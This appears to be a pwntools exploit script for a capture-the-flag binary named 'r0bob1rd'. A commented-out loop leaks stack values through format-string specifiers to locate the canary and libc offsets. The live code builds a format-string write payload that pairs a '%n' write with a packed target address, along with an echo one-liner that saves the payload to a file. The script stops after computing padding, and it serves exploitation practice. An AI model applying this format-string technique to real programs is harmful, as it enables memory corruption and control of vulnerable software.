# from pwn import *

# elf = context.binary = ELF('./r0bob1rd')
# context.log_level = 'error'

# for i in range(50):
#     io = process(elf.path)
#     io.recvuntil(b'Select a R0bob1rd > ')
#     io.sendline(b'1')
#     io.recvuntil(b"Enter bird's little description\n> ")
#     io.sendline(f"AAAAAAAA%{i}$p".encode())
#     io.recvuntil(b'[Description]\n')
#     print(io.recvline().strip().decode() + f" (offset {i})")

# # # canary is at 21 
# # libc at 11


from pwn import *

elf = context.binary = ELF('./r0bob1rd')


# echo -e '1\n%4197066x%10$nAA\x28\x20\x60\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > payload

paylaod = b"%4197066x%10$nAA" + pack(0x602028) 

print(106 - len(paylaod)) 